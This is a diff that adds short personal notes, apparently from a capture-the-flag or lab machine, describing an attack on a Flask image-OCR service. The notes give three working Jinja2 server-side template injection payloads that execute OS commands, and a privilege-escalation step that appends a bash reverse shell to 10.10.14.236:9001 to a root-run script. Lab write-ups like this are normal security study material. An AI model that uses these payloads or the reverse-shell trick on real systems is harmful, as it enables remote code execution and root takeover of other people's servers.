@@ -1,0 +1,22 @@
+------------------
+NOTES
+------------------
+
+------------------
+PROCESS
+------------------
+
+subdomain which does OCR on images
+Flask = look for ssti
+
+ssti on the image
+	rce using payload all the things
+
+		{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+		{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+		{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+
+priv esc:
+	have /usr/local/sbin in path, can append to the script running as root
+		echo "bash -i >& /dev/tcp/10.10.14.236/9001 0>&1" >> /usr/local/sbin/ssh-alert.sh
+	ssh in again and have a listener
